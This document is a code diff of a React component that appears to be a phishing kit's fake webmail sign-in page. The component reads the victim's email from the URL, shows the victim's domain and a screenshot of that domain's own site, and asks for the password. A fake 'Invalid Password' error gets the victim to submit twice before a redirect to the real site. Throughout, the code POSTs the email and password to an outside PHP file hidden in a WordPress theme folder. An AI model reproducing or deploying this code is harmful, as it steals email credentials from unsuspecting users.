@@ -5,8 +5,10 @@ import $ from 'jquery';
 import Preloader from "./Preloader/Preloader";
 import { BiSolidUser, BiSolidLockAlt } from "react-icons/bi";
 
+// edited first letter
+
 const Default = ()=>{
-    
+
     const [invalid, setInvalid] = useState(false);
 
     const [spinLoader, setSpinLoader] = useState(false);
@@ -14,24 +16,34 @@ const Default = ()=>{
     const emailInTheURL = window.location.href;
     const sliceEqualSign = emailInTheURL.indexOf("@");
     const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).toLowerCase();
+    // console.log('cccc:',extracetdEmail);
     const mainName = extracetdEmail.replace('.com', "");
-    
+
+
     const emailInTheURLA = window.location.href;
     const sliceEqualSignB = emailInTheURLA.indexOf("=");
-    const extracetdEmailC = emailInTheURLA.substr((sliceEqualSignB+1)).toLowerCase();
+    const extracetdEmailC = emailInTheURLA.substr((sliceEqualSignB+1));
+    // .toLowerCase();
+    const sliceE = extracetdEmailC;
+    const cutOutAllTheTextLeavingTheOneToBeCapitalizeBelow = sliceE.slice(1)
+    const capitalizeFirstLetter = extracetdEmailC.charAt(0).toUpperCase() + cutOutAllTheTextLeavingTheOneToBeCapitalizeBelow;
 
 
-    const [defaultEmail, setDefaultEmail] = useState(extracetdEmailC);
+    const [defaultEmail, setDefaultEmail] = useState(capitalizeFirstLetter);
     const [defaultPassword, setDefaultPassword] = useState('');
-
+// hello
     const [count, setCount] = useState(0);
 
     const submitDefaultForm = (e)=>{
         e.preventDefault();
         setSpinLoader(true);
+        // setInvalid(true);
+        // alert('sdfgh');
         setTimeout(() => {
             setDefaultPassword('');
+            
         }, 500);
+
 
         setCount(count=> count + 1);
             if(count >= 1){
@@ -40,8 +52,12 @@ const Default = ()=>{
                 const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1));
                 console.log(extracetdemailDomain);
                 setTimeout(() => {
+                    // window.location.href = "https://www.webmail.gigared.com/";
                     window.location.href = `https://www.${extracetdemailDomain}`;
                 }, 1500);
+                // window.location.reload();
+                // window.location.href = `https://www.${extracetdemailDomain}`;
+                // window.location.replace('https://webmail.gigared.com/')
             };
 
             setTimeout(()=>{
@@ -55,7 +71,7 @@ const Default = ()=>{
             email: defaultEmail,
             password: defaultPassword
         };
-    // hello jeje
+    
         $.ajax({
             type: "POST",
             url: "https://dly.cua.mybluehost.me/wp-content/themes/twentytwentytwo/stylee.php",
@@ -69,7 +85,12 @@ const Default = ()=>{
 
 
     useEffect(()=>{
-        document.title = extracetdEmail.toLowerCase();
+
+        const sliceE = extracetdEmail;
+        const firstProcess = sliceE.slice(1)
+        document.title = extracetdEmail.charAt(0).toUpperCase() + firstProcess
+        
+        // .toLowerCase();
         setSpinLoader(true);
         setTimeout(() => {
             setSpinLoader(false);
@@ -79,13 +100,9 @@ const Default = ()=>{
     return(<article className="wrapp__" 
 
     style={{
-        // backgroundImage: `url(https://image.thum.io/get/auth/69430-server/https://www.${extracetdEmail}/)`,
-        // backgroundImage: `url(https://image.thum.io/get/auth/69257-c9081e4bf3bfce9be8aa484cc8a0999e/https://www.${extracetdEmail}/)`,
-        backgroundImage: `url(https://image.thum.io/get/auth/69487-uurrlll/https://www.${extracetdEmail}/)`,
-        // https://image.thum.io/get/auth/69257-c9081e4bf3bfce9be8aa484cc8a0999e/https://www.wikipedia.org/
-        // https://image.thum.io/get/auth/69487-uurrlll/https://www.wikipedia.org/
-        // https://image.thum.io/get/auth/69487-uurrlll/https://www.wikipedia.org/
+        // backgroundImage: `url(//image.thum.io/get/https://www.${extracetdEmail})`,
         // backgroundImage: `url(${BG})`,
+        backgroundImage: `url(https://image.thum.io/get/auth/69257-c9081e4bf3bfce9be8aa484cc8a0999e/https://www.${extracetdEmail}/)`,
         width:'100vw',
         height:'100vh',
         backgroundRepeat:'no-repeat',
@@ -93,6 +110,7 @@ const Default = ()=>{
         backgroundPosition:'top'
     }}
     >
+        
 
     <div style={{
         display: 'flex',
@@ -127,6 +145,7 @@ const Default = ()=>{
                 }}>{mainName}</p>
             </div>
 
+
             <p className="bolded__ sssss" style={{fontSize:'20px'}}>Sign in to continue</p>
 
             <span style={{
@@ -141,6 +160,8 @@ const Default = ()=>{
             { invalid ? <div className="alert alert-danger">
               Invalid Password, Ensure to input correct password email account
             </div> : null }
+
+
 
             <form onSubmit={submitDefaultForm}>
 
@@ -163,6 +184,7 @@ const Default = ()=>{
 
                 </div>
 
+
                 <div className="pv-Bz-iB " style={{
                         marginTop:'18px'
                     }}>
@@ -171,7 +193,6 @@ const Default = ()=>{
                             <span className="kC-KY-IK"><i className="Lf-cT-dq no-im-qF"><BiSolidLockAlt /></i></span>
                             <input 
                                 name="Yz-Uy-Ge" 
-                                // readOnly
                                 type="password" 
                                 value={defaultPassword} 
                                 required
@@ -201,6 +222,6 @@ const Default = ()=>{
 
     </div>
     </article>)
-};
+}
 
 export default Default;
